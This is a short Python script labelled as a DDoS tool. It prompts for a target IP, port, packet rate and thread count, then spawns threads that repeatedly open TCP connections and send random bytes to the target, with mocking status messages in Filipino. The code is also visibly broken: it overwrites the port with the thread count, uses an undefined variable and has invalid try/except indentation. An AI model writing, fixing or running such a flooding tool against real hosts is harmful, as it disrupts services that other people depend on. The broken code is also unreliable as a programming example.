#DDOS
#DONT STEAL LOL

import socket
import random
import threading

ip = str(input('[+] TARGET :'))
port = int(input('[+] PORT :'))
pack = int(input('[+] PACKET/S :'))
port = int(input('[+] THREADS :'))


def start():
  hh = random._urandom(10)
  xx = int(0)
  while True:
    try:
      s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
      s.connect((ip,port))
      s.send(hh)
    for i in range(pack):
      s.send(hh)
    xx += 1
    print('UMUULAN NA '+ip+' | Sent:'+str(xx))
  except:
    s.close()
    print('iyak na')
    
for x in range(thread):
  thred = threading.Thread(target=start)
  thred.start()
    
    
  
